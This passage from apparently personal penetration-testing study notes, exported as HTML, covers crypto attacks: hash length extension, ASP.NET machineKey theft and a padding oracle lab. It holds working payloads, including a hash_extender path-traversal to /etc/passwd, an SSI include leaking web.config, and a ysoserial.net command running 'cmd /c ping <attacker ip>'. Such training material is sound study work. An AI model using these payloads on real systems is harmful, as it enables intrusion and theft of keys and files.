style="white-space:pre-wrap;word-break:break-all"># On other part of the communication, the server relies on the secret For data validation purposes
+# An attacker that does not know the value of the secret can still generate a valid hash For
+{secret || data || attacker_controlled_data}.
+
+# An attacker can calculate a valid hash For a message without knowing the value of the secret.
+# He can do that by just guessing its length. Hashes are calculated in blocks and the hash of one block is the state For the next block.
+</code></pre><p id="34d0106a-944c-4d1c-8dc9-e227a350c399" class="">Example</p><p id="14e5d217-9403-44e3-94f8-208330c7cfa8" class="">Request:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a7cf0bd3-cd2b-492b-96c7-44f935d060ab" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">stock_quantity=20&amp;price=1000
+</code></pre><p id="6c45171c-6273-4929-9f82-0189f1781114" class="">Hash:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="999ede34-0ade-4f9b-b713-8ea73afb0535" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">[secretpass|stock_quantity=20&amp;price=1000|padding] =&gt; Hash1/State1
+</code></pre><p id="c51721f8-7bab-4897-9ff5-8c9fc197a384" class="">Final Request:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="520746db-8d34-443d-93ee-efa5cdacb850" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">stock_quantity=20&amp;price=1000&amp;hash=Hash1
+</code></pre><blockquote id="e30e70d7-ee9e-4216-8ea3-d2807fb84619" class="">If an attacker manages to identify the length of padding, he will have all the info needed to calculate a new hash.</blockquote><p id="1a4761aa-89ee-4bf6-b901-02e68485d19b" class="">Attack Hash:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e6795846-36fe-4f7b-86db-749d6128362f" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">[secretpass|stock_quantity=20&amp;price=1000|padding|&amp;price=100]
+</code></pre><p id="02ec5db3-a4b8-4817-9f24-913d42970ea9" class="">Attack Hash:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="cd4b35df-8818-4bf1-97ff-21fb861bc876" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">[State1|&amp;price=10]=&gt;Hash2/State2
+</code></pre><p id="99c8a3f8-81a7-4428-b043-3f6358cc31d6" class="">Final Request:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="cf46b8bf-4733-402f-ba66-10c01163a965" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">stock_quantity=20&amp;price=1000+padding&amp;price=100&amp;hash=Hash2
+</code></pre><p id="f7504637-14e4-41bc-a7c5-4801ef97de76" class="">Moreover the calculations required during Hash Length Extension Attacks:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="587ff794-bb6d-4e95-aa47-ea40b9cfc70d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks
+</code></pre><h2 id="3dc92425-ed55-47d0-ad2b-e14380226033" class=""><strong>Hash length extension Scenario</strong><strong><a href="https://johnermac.github.io/notes/ewptx/crypto/#hash-length-extension-scenario"></a></strong></h2><ul id="cdac6d98-1395-400a-a9b6-805d7f38048b" class="bulleted-list"><li style="list-style-type:disc">https://github.com/SpiderLabs/CryptOMG</li></ul><p id="5e577463-460c-49aa-beba-e5ea305e44b2" class="">Challenge 5 is what we need to witness how a hash length extension can be performed</p><p id="8031130c-15a4-45eb-9c53-9fc046a0d421" class="">Lets try reading the contents of /etc/passwd by executing the attack</p><p id="01a0a2f2-b9e3-4fba-867a-ee62bcb0d3e8" class="">We dont need to know the secret value being used. We only need to successfully guess the length of the secret.</p><p id="aad13333-45e4-4c91-9aaa-c6793207ff78" class="">For this task we can use <strong>hash_extender</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f4a7426a-911c-4f03-8e65-73fb3dba00cc" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">#  https://github.com/iagox86/hash_extender
+# The specify a known hash value
+# The specify an estimation regarding the secrets length (between 10 and 40 bytes)
+# We will have to experiment with the amount of ../../ to be used
+
+./hash_extender -f sha1 --data &#x27;test&#x27; -s &lt;hash&gt; --append &#x27;../../../../../../../../../etc/passwd&#x27; --secret-min=10 --secret-max=40 --out-data-format=html --table &gt; payloads.out
+</code></pre><ul id="12f907ca-4e63-4fc0-8e7e-218b3854fc06" class="bulleted-list"><li style="list-style-type:disc">Now use the payloads.out inside the BURP Intruder</li></ul><ul id="a4c86de6-3e19-4d12-bfe3-5246ac0a704f" class="bulleted-list"><li style="list-style-type:disc">we will follow a Sniper approach</li></ul><blockquote id="91113712-e2eb-4cae-a9dc-ed1c0f3fa79f" class="">Eventually, we are able to see the content of /etc/passwd by means of a Hash Length Extension Attack.</blockquote><figure id="b937972d-8966-4955-8af0-949cebd1391e" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/67.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/67.png"/></a></figure><h2 id="16ac4002-5a4c-4ef0-9825-580a993da850" class=""><strong>The importance of machineKey</strong><strong><a href="https://johnermac.github.io/notes/ewptx/crypto/#the-importance-of-machinekey"></a></strong></h2><ul id="8a86ecc8-96ca-4a58-98ff-b26e7073fa80" class="bulleted-list"><li style="list-style-type:disc">https://msdn.microsoft.com/en-us/data/w8h3skw9(v=vs.110)</li></ul><p id="9b459bcf-959c-4432-948e-c637bbe97ae3" class="">Its a feature used to specify encryption settings For application services, such as view state, forms authentication and roles in a system.</p><ul id="0ac09001-6abf-49bd-9ad3-fe6f30a952f6" class="bulleted-list"><li style="list-style-type:disc">Machine Key contains a set of fields like validation key, decryption key and so on where unique keys are to be entered.</li></ul><figure id="68ed5f00-a2d9-44e0-b049-f2fb1a194b97" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/68.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/68.png"/></a></figure><figure id="2e80854c-f5e2-40b6-b660-cd55ab1b27f6" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/69.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/69.png"/></a></figure><h3 id="93945b12-e87f-4291-a967-58501e1bb9da" class=""><strong>Leveraging a leaked machineKey for RCE</strong><strong><a href="https://johnermac.github.io/notes/ewptx/crypto/#leveraging-a-leaked-machinekey-for-rce"></a></strong></h3><p id="7628884d-6517-43c9-865a-c5ca18f0822b" class="">Scenario, we are pentesting a .NET application</p><ol type="1" id="ccbf02dc-7a0b-4fb1-a70c-84850d101196" class="numbered-list" start="1"><li>The application offers file uploading functionality (the ‘aspx’, ‘.config’,’.ashx’, ‘.asmx’, ‘aspq’, ‘.axd’,’.cshtml’,’.cshtml’,’.rem’,’.soap’,’.vbhtm’, ‘.vbhtml’,’.asa’,’.asp’, and ‘.cer’ extensions are blacklisted.</li></ol><ol type="1" id="e585c2e1-28d1-4512-a59c-5038f2424873" class="numbered-list" start="2"><li>Validation of viewstate MAC is performed (this prevents deserialization exploitation without knowing the cryptographic key - machineKey)</li></ol><blockquote id="b64c5913-0e96-42b8-941f-73f9573a71a5" class="">Our only change is to find the machine Key</blockquote><p id="f869c5f6-d2ea-427d-9f7f-b7479eb893e0" class="">We can try uploading the following, in attempt to leak the machine key:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="979c4265-ca81-4186-a1ef-11ebaab466bd" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;!--#include file=&quot;..\..\web.config&quot; --&gt;
+// test.shtml
+</code></pre><p id="de4d9463-c0c1-430e-909b-cef824fdff9f" class="">Attempt successfull, we can open view source code to retrieve its contents</p><p id="d0e214d9-c49d-4e51-a5a2-a922c684dfda" class="">Now we need to figure out how the MAC generated and verified:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4890afe6-a51f-4f75-adcf-fd5f4e015be3" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- https://referencesource.microsoft.com/#system.web/UI/ObjectStateFormatter.cs
+- https://referencesource.microsoft.com/#System.Web/Configuration/MachineKeySection.cs
+</code></pre><p id="0b339e1e-3311-4e0e-8118-dfd28abd742a" class="">If u read the above, u will conclude to the below logic:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="25bf9551-a789-49c3-a3a8-799f868df285" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- MAC_HASH = MD5(serialized_data_binary + validation_key + 0x00000000)
+- VIEWSTATE = Base64_Encode(serialized_data_binary + MAC_HASH)
+</code></pre><h3 id="5415030b-033e-45fa-aa8a-69b337b73e5c" class=""><strong>Exploitation</strong><strong><a href="https://johnermac.github.io/notes/ewptx/crypto/#exploitation"></a></strong></h3><p id="fdad038b-fe9a-463b-84f2-8263cc9299c6" class="">We need the <strong>YsoSerial.net</strong> and to implement the MAC-related logic of the previous information</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c02eaf93-6f0f-40d0-a229-b263c38cc21e" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">ysoserial.exe -o base64 -g TypeConfuDelegate -f ObjectStateformatter -c &quot;cmd /c ping &lt;attacker ip&gt;&quot;
+</code></pre><figure id="7f4784be-18cc-495c-8764-2d2bde1ca7e8" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/70.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/70.png"/></a></figure><blockquote id="af3ea0b6-07d9-4cf4-99e2-9ceba65f454e" class="">In this case, we did not attack crypto per se. Instead, we leveraged the SSI feature of the underlying server to leak the cryptographic key</blockquote><blockquote id="18a1648f-253b-41ac-8bfd-79195c54be65" class="">Implementing strong crypto is important, but protecting the cryptographic key is of equal importance.</blockquote><h2 id="a2f3036f-4494-4ccb-a5c3-ad90c94a7d6c" class=""><strong>Subverting HMAC Scenario</strong><strong><a href="https://johnermac.github.io/notes/ewptx/crypto/#subverting-hmac-scenario"></a></strong></h2><p id="39ff5f0c-d30f-46ca-9a97-520279351aca" class="">Example of HMAC can be subverted through Remote Memory Disclosure in Node.js</p><p id="05d158a7-5b8b-496b-8ed3-2e3389ee831e" class="">The source code of the vuln app will be provided, so we can try the attack locally</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d00cb721-04c1-4c80-9550-975570d48e1d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- https://en.wikipedia.org/wiki/HMAC
+</code></pre><h2 id="fe806f26-8247-4dc5-a99e-9edb24c9481e" class=""><strong>Lab</strong><strong><a href="https://johnermac.github.io/notes/ewptx/crypto/#lab"></a></strong></h2><h3 id="275e99c8-a64c-4e2e-8a9f-175b60e67e54" class=""><strong>Setup code</strong><strong><a href="https://johnermac.github.io/notes/ewptx/crypto/#setup-code"></a></strong></h3><ul id="1408b03a-eeef-4be2-961f-64e349daea60" class="bulleted-list"><li style="list-style-type:disc">https://github.com/GDSSecurity/PaddingOracleDemos</li></ul><p id="fcc1e6a5-a4fa-4f0f-b2b5-5b6af77fd854" class="">Solution</p><p id="fe5363ff-fe29-4620-984f-26f4e84aecca" class="">Step 1: Open the lab link to access the Kali GUI instance.</p><p id="994159e0-b370-4dc6-8f64-c34d27e9f693" class="">…</p><p id="f14fd0c7-865e-44cf-ac23-96dcfafa4096" class="">Step 2: Check if the provided machine/domain is reachable.</p><p id="8aa47f41-7294-4f05-8e36-387c847166ba" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4e5420f3-66f1-4eb9-911a-276c1617e528" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">ping -c3 demo.ine.local
+</code></pre><ul id="6f14177d-c4bf-4fa4-9b26-b8a17eb70a89" class="bulleted-list"><li style="list-style-type:disc">The provided machine is reachable.</li></ul><p id="f84df6a7-84aa-4a64-a9fc-76091513f32b" class="">Step 3: Check open ports on the provided machine.</p><p id="32dce9bd-1fe0-444a-a9d5-e564d31e9d47" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="01ab7c27-778f-449e-9c07-c0ddb6a63ecd" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">nmap -sS -sV demo.ine.local
+</code></pre><blockquote id="2d3ea8b7-b196-473d-850e-63674c502d60" class="">Port 80 is open on the target server. Werkzeug httpd server is running on that port.</blockquote><p id="b3087d89-96bd-4647-99c9-5c04bd10493e" class="">Step 4: Check the web application available on port 80.</p><p id="93d37ecf-7eb5-4d46-aed6-a9f726b41727" class="">Encrypt the following plaintext:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="83e8107f-b796-4e9e-b9ae-93d614ab1f66" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">ApplicationUsername=user&amp;Password=sesame
+</code></pre><ul id="eb2f604b-8498-46df-8aad-bf4c49bc1e24" class="bulleted-list"><li style="list-style-type:disc">Visit the following URL for encrypting the above plaintext (make sure to URL encode the = and &amp; characters):</li></ul><p id="2f30af28-8ce6-42f5-9e28-790bb37883cc" class="">URL: http://demo.ine.local/encrypt?plain=ApplicationUsername%3duser%26Password%3dsesame</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="5535e341-b701-4391-9e73-0a51e881e6a1" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Encrypted text is: 6b664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e5bbd4363b9d91d4c9100beae6ce34e80
+</code></pre><p id="e1da979c-d004-4686-9ea8-e8066f3f4941" class="">Step 5: Decrypt the ciphertext.</p><p id="f6aa4dba-62fd-4ccc-a998-d346f355d900" class="">To decrypt the ciphertext, we can visit the /echo endpoint and provide the ciphertext:</p><p id="ba953f2d-b190-425d-9b49-933e12784ddd" class="">URL: http://demo.ine.local/echo?cipher=6b664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e5bbd4363b9d91d4c9100beae6ce34e80</p><blockquote id="0f365677-93b2-405b-a5a8-178de56df462" class="">The plaintext message was successfully retrieved.</blockquote><p id="def9fc7f-1f7c-43f1-ade5-cec78edfe66e" class="">Step 6: Confirm a padding oracle’s presence.</p><p id="83c9fba8-94d2-40f5-92ba-c78dee11cc44" class="">A padding oracle’s presence can be identified as follows - Try to tamper with the correct encrypted string and notice the exceptions (notice the “gg” part at the beginning of the ciphertext):</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="fd237328-115a-4fc1-a8f6-5b8f7ee9f36a" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">URL: http://demo.ine.local/echo?cipher=gg664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e5bbd4363b9d91d4c9100beae6ce34e80
+</code></pre><ul id="7020283d-0801-4c64-9a0e-8eb39a0ac563" class="bulleted-list"><li style="list-style-type:disc">Notice the exception. The application expected hexadecimal digits but found non-hexadecimal digits instead (letter ‘g’).</li></ul><p id="ee2309c6-9b32-4d2c-acf7-f5b103fd24ff" class="">Now check the response from the following URL:</p><ul id="3812fbb8-c2de-4a18-b3c6-54ad45e5bd3b" class="bulleted-list"><li style="list-style-type:disc">URL: http://demo.ine.local/echo?cipher=g</li></ul><p id="d4684490-c331-4ee1-9c38-21a8040d5aa2" class="">Now check the response from the following URL:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9fcc176b-1b61-451e-918b-79a6c7b7046e" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">URL: http://demo.ine.local/echo?cipher=6b
+</code></pre><p id="48ad45d6-4af7-4f4c-bcff-826f5075d844" class="">These errors may suggest that:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e039a7ee-138e-4716-96b9-8fc5da6f73b4" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- The string consists of hexadecimal characters (0-0xff)
+- The string has to be aligned to two characters
+- The string is being decrypted somehow
+</code></pre><ul id="2b7a893a-6830-4cc6-ad4d-97679b1e4d94" class="bulleted-list"><li style="list-style-type:disc">Since different strings produced different exceptions, there might be a chance to perform a padding oracle attack here.</li></ul><p id="0287d5bc-2f13-4759-aea4-db0f0206c342" class="">Step 7: Decrypt the encrypted data by performing a padding oracle attack.</p><blockquote id="5f9137f9-df63-4e11-9a87-d4d235b314da" class="">PadBuster is started with the following arguments in our attempt to decrypt the encrypted data:</blockquote><p id="bb4ec3c5-e811-4969-a8dd-c65d58d0d5b3" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" 